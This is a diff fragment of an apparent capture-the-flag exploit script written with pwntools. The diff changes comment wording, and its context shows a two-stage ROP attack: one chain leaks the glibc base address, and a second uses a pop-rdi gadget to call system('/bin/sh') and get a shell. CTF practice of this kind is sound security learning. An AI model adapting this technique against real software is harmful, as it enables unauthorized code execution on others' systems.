@@ -15,7 +15,7 @@ p = gdb.debug('./chall_patched', '''
 e = ELF('./chall')
 glibc_e = ELF('./libc.so.6')
 
-# 1. ROP with special gadgets to retrieve glibc base address
+# 1. first ROP: retrieve glibc base address
 p.sendlineafter(b"2. Multiplayer\n", b'1')
 FAKE_RBP = 0x404800
 GADGET_1 = 0x4011bb  # ret;
@@ -37,7 +37,7 @@ log.info(f"glibc base address: {hex(glibc_base_addr)}")
 # satisfy "call read_int; cmp eax, 0x1; je 0x4011d8" to jump to 0x4011d8
 p.sendline(b'1')
 
-# 2. ROP to trigger system('/bin/sh\x00')
+# 2. second ROP: trigger system('/bin/sh\x00')
 p.sendlineafter(b"2. Multiplayer\n", b'1')
 chain2 = [
     glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
